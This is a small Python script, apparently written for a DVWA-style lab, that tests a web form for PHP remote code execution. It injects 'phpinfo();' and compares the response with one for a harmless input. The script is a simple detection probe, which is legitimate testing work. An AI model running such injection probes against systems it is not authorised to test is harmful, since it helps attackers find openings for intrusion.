import requests

def check_rce_vulnerability_code(url):
    # 检测RCE漏洞的Payload
    data = {
        'txt': 'phpinfo();',
        'submit': '提交'
    }
    header = {
        'Cookie': 'PHPSESSID=5r1bk8gn8nnipo6jnoaipg2tm3; security=impossible',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36'
    }
    # 发送请求，注入Payload，并检查响应中是否包含漏洞标识
    response = requests.post(url=url, data=data, headers=header)
    data = {
        'txt': 'hello',
        'submit': '提交'
    }
    response2 = requests.post(url=url, data=data, headers=header)

    # 返回布尔值，表示是否存在RCE漏洞
    return response.text != response2.text


# 调用函数进行漏洞检测
# check_rce_vulnerability(target_url)
